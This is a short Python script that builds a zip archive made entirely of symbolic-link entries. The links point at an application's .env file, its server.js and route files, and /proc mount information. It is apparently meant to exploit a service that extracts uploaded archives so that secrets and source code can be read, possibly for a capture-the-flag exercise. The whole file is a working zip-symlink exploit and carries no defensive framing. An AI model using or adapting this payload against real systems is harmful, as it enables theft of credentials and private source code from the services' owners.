from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED
import stat, time

def add_symlink(zf, name, target):
    zi = ZipInfo(name)
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zi.compress_type = ZIP_DEFLATED
    zf.writestr(zi, target)

suffix = time.strftime("%H%M%S")
targets = {
    # likely .env locations
    f"app_dotenv_{suffix}": "/app/.env",
    f"app_server_js_{suffix}": "/app/server.js",
    f"app_routes_index_js_{suffix}": "/app/routes/index.js",
    #f"package_json_{suffix}": "/app/package.json",
    f"proc_mountinfo_{suffix}": "/proc/self/mountinfo",
    f"proc_mounts_{suffix}": "/proc/mounts",
    
}

zipname = f"symlink_hunt_{suffix}.zip"
with ZipFile(zipname, "w", ZIP_DEFLATED) as z:
    for name, target in targets.items():
        add_symlink(z, name, target)

print(f"[+] Wrote {zipname}")
